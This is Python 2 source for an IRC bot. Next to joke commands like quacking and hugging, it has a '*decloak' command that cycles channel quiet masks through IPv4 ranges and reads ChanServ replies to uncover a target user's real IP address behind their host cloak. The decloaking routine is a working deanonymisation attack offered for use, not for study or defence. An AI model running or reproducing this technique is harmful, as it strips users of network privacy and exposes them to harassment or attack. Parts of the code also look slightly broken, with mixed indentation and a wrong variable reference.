#!/usr/bin/env python2.7

from gevent import monkey
monkey.patch_all()

'''
TODO:
 - Make decloaking happen in another thread (or rather, decloaking that doesn't block)
 - Nicer formatted output
 - Flood Protection
 - factoids
 - logging
 - more commands
 - zwsp
 - port rest of code to gevent
'''

import argparse, base64, gevent, json, os, random, signal, socket, ssl, sys, time

def send_fmt(line):
    return '>>> {line}'.format(line=line)

def send(sock, msg):
    print send_fmt(msg)
    sock.send('{msg}\r\n'.format(msg=msg))

def response_fmt(line):
    return '<<< {line}'.format(line=line)

def readline(sock, recv_buffer=4096, delim='\r\n'):
    buffer = ''
    data = True

    while data:
        data = sock.recv(recv_buffer)
        buffer += data

        while buffer.find(delim) != -1:
            line, buffer = buffer.split(delim, 1)
            print response_fmt(line)
            yield line

def get_json_args(args):
    if not os.path.isfile(argv.configuration):
        print '{file} configuration file could not be found'.format(file=argv.configuration)
        sys.exit(1)

    data = ''

    with open(args.configuration, 'r') as handle:
        data = json.load(handle)

    if args.server is None:
        args.server = data['server']

    if args.port is None:
        args.port = data['port']

    if args.server_key is None:
        args.server_key = data['server_key']

    if not args.ssl:
        args.ssl = data['ssl']

    if args.user is None:
        args.user = data['user']

    if args.password is None:
        args.password = data['password']

    if args.nick is None:
        args.nick = data['nick']

    if args.ident is None:
        args.ident = data['ident']

    if args.realname is None:
        args.realname = data['realname']

    if args.decloak_channel is None:
        args.decloak_channel = data['decloak_channel']

    if args.duck_channel is None:
        args.duck_channel = data['duck_channel']

    if args.channels is None:
        args.channels = data['channels']

    if args.delay is None:
        args.delay = data['delay']

    return args

def get_socket(use_ssl=True):
    if use_ssl:
        return ssl.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM))

    return socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def sasl_succsessful(sock):
    for line in readline(sock):
        line = line.split()

        if line[1] == '903':
            return True

        elif line[1] in ('904', '906'):
            return False

def sasl_connect(sock, server, port, server_key, user, password, nick, ident, realname):
    saslstring = base64.b64encode('{user}\x00{user}\x00{password}'.format(user=user, password=password))

    sock.connect((server, port))
    send(sock, 'CAP REQ :sasl')

    if server_key:
        send(sock, 'PASS {server_key}'.format(server_key=server_key))

    send(sock, 'NICK {nick}'.format(nick=nick))
    send(sock, 'USER {ident} * * :{realname}'.format(ident=ident, realname=realname))
    send(sock, 'AUTHENTICATE PLAIN')
    send(sock, 'AUTHENTICATE {saslstring}\n'.format(saslstring=saslstring))

    if sasl_succsessful(sock):
        send(sock, 'CAP END')
        return True

    else:
        return False

def main(argv):
    sock = None

    while True:
        sock = get_socket(argv.ssl)

        if sasl_connect(sock, argv.server, argv.port, argv.server_key, argv.user, argv.password, argv.nick, argv.ident, argv.realname):
            break

        sock.close()

    def handler(signum, frame):
        duck_action = (
            'Quack!',
            '\x01ACTION swims around\x01',
            '\x01ACTION dives for some food\x01',
            '\x01ACTION waddles around\x01',
            '\x01ACTION is ducking around\x01'
        )

	for duck_channel in argv.duck_channel.split(','):
            send(sock, 'PRIVMSG {duck_channel} :{quack}'.format(duck_channel=duck_channel, quack=duck_action[random.randint(0, len(duck_action)-1)]))

        signal.alarm(random.randint(1,100))

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(random.randint(50, 100))

    send(sock, 'JOIN {decloak_channel},{duck_channel},{channels}'.format(decloak_channel=argv.decloak_channel, duck_channel=argv.duck_channel, channels=argv.channels))

    ip_ranges = tuple(tuple(ip_range * 16 + octet for octet in range(16)) for ip_range in range(16))
    ip = 'x'
    decloaking = False
    paused = False
    get_next_line = False
    current_range = 0
    nick_to_decloak = ''
    respond_to = ''

    for line in readline(sock):
        line = line.split(' ', 3)

        if line[0] == 'PING':
            send(sock, 'PONG {code}'.format(code=line[1]))

        elif len(line) > 2 and line[1] == 'MODE':
            nick = line[0][1:]
            origin = line[2]
            msg = line[3][1:]

            if nick == 'ChanServ!ChanServ@services.' and get_next_line:
                get_next_line = False
                current_range = 0

                if '@' in msg and msg.split('@')[1][-1] != '*':
                    send(sock, 'PRIVMSG {channel} :{user}\'s ip is {ip}'.format(channel=respond_to, user=nick_to_decloak, ip=msg.split('@')[1]))
                    ip = 'x'
                    decloaking = False
                    paused = False
                    nick_to_decloak = ''
                    send(sock, 'mode {channel} -m'.format(channel=argv.decloak_channel))
                    continue

                ip = msg.split('@')[1].split('*')[0] + 'x'

        elif decloaking and not paused:
            if current_range == len(ip_ranges):
                send(sock, 'PRIVMSG {channel} :{user} is either not online or not using ipv4'.format(channel=respond_to, user=nick_to_decloak))
                ip = 'x'
                decloaking = False
                paused = False
                get_next_line = False
                current_range = 0
                nick_to_decloak = ''
                respond_to = ''

            def decloak(sock, ip, ip_ranges, current_range, decloak_channel, delay, nick_to_decloak):
                gevent.sleep(0)
                for next in range(0, 4-len(ip.split('.'))):
                    ip += '.*'

                for possible in ip_ranges[current_range]:
                    send(sock, 'mode {channel} +q {next}'.format(channel=decloak_channel, next=ip.replace('x', str(possible))))
                    time.sleep(delay)

                send(sock, 'chanserv unquiet {channel} {user}'.format(channel=decloak_channel, user=nick_to_decloak))
                send(sock, 'chanserv clear {channel} bans q'.format(channel=decloak_channel))

            gevent.spawn(decloak, sock, ip, ip_ranges, current_range, argv.decloak_channel, argv.delay, nick_to_decloak).run()
            paused = True

        elif len(line) > 2 and line[1] == 'PRIVMSG':
            nick = line[0].split('!')[0][1:]
            user = line[0].split('!')[1].split('@')[0]
            host = line[0].split('@')[1]
            origin = line[2]
            msg = line[3][1:]

            if host in ('gateway/tor-sasl/money', 'unaffiliated/uf') and msg.startswith('*decloak ') and not decloaking:
                send(sock, 'mode {channel} +m'.format(channel=argv.decloak_channel))
                send(sock, 'chanserv clear {channel} bans q'.format(channel=argv.decloak_channel))
                decloaking = True
                nick_to_decloak = msg.split()[1]
                respond_to = origin
                send(sock, 'PRIVMSG {origin} :Now decloaking {user}\'s ip...'.format(origin=origin, user=nick_to_decloak))
                send(sock, 'PRIVMSG {origin} :This may take a while...'.format(origin=origin))

            elif msg.startswith('*feed '):
                if nick[-1] == 's':
                    send(sock, 'PRIVMSG {origin} :\x01ACTION greedily eats {nick}\' {treat}\x01'.format(origin=origin, nick=nick, treat=msg.split(' ', 1)[1]))
		else: 
                    send(sock, 'PRIVMSG {origin} :\x01ACTION greedily eats {nick}\'s {treat}\x01'.format(origin=origin, nick=nick, treat=msg.split(' ', 1)[1]))

            elif msg.startswith('*join ') and host == 'linuxpadawan/padawan/nchambers': 
                send(sock, 'JOIN {channel}'.format(channel=msg.split(' ')[1]))

            elif msg.startswith('*part ') and host == 'linuxpadawan/padawan/nchambers':
                send(sock, 'PART {channel}'.format(channel=msg.split(' ')[1]))

            elif msg == '*part' and host == 'linuxpadawan/padawan/nchambers':
                send(sock, 'PART {channel}'.format(channel=origin))

            elif msg.startswith('*hug '):
                send(sock, 'PRIVMSG {origin} :\x01ACTION hugs {person}\x01'.format(origin=origin, person=msg.split(' ', 1)[1]))

            elif msg == '*hug':
                send(sock, 'PRIVMSG {origin} :\x01ACTION hugs {person}\x01'.format(origin=origin, person=nick))

            elif msg == '*penis':
                send(sock, 'PRIVMSG {origin} :\x01ACTION fuchs the penis\x01'.format(origin=origin))

            elif msg == '.quack':
                send(sock, 'PRIVMSG {origin} :\x01ACTION quacks at {person}'.format(origin=origin, person=nick))

        elif len(line) > 2 and line[1] == 'NOTICE':
            if '@' not in line[0]:
                continue

            nick = line[0].split('!')[0][1:]
            user = line[0].split('!')[1].split('@')[0]
            host = line[0].split('@')[1]
            origin = line[2]
            msg = line[3][1:]

            if nick == 'ChanServ':
                if msg.startswith('Unquieted'):
                    get_next_line = True

                elif msg.startswith('No'):
                    current_range += 1

                paused = False

if __name__ == '__main__':
    raw_args = argparse.ArgumentParser()
    raw_args.add_argument('configuration', type=str, nargs='?', help='JSON configuration file')
    raw_args.add_argument('-s', '--server', type=str, help='server to connect to')
    raw_args.add_argument('-p', '--port', type=int, help='port to connect to')
    raw_args.add_argument('-k', '--server-key', type=str, help='Server key for server')
    raw_args.add_argument('-S', '--ssl', action='store_true', help='connect using ssl')
    raw_args.add_argument('-u', '--user', type=str, help='username to authenticate with')
    raw_args.add_argument('-K', '--password', type=str, help='password key to authenticate with')
    raw_args.add_argument('-n', '--nick', type=str, help='IRC nickname')
    raw_args.add_argument('-i', '--ident', type=str, help='IRC ident')
    raw_args.add_argument('-r', '--realname', type=str, help='IRC realname')
    raw_args.add_argument('-d', '--decloak-channel', type=str, help='Channel to decloak in')
    raw_args.add_argument('-U', '--duck-channel', type=str, help='channel to duck around in')
    raw_args.add_argument('-c', '--channels', type=str, help='channels to join') #fix casing
    raw_args.add_argument('-D', '--delay', type=float, help='delay between commands')
    argv = raw_args.parse_args()

    if argv.configuration:
        gevent.spawn(main, get_json_args(argv)).run()

    gevent.spawn(main, argv)
